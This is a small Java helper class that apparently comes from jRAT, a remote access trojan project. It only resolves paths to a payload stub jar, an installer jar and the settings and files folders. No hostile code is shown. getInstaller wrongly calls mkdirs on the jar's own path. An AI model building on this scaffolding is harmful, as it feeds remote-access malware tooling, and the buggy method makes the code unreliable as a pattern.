package pro.jrat.io;

import java.io.File;

public final class Files {

	public static final File getStub() {
		return new File("files/Stub.jar");
	}

	public static final File getFiles() {
		File file = new File("files/");
		file.mkdirs();
		return file;
	}

	public static final File getSettings() {
		File file = new File("settings/");
		file.mkdirs();
		return file;
	}

	public static final File getInstaller() {
		File file = new File("files/Installer.jar");
		file.mkdirs();
		return file;
	}

}
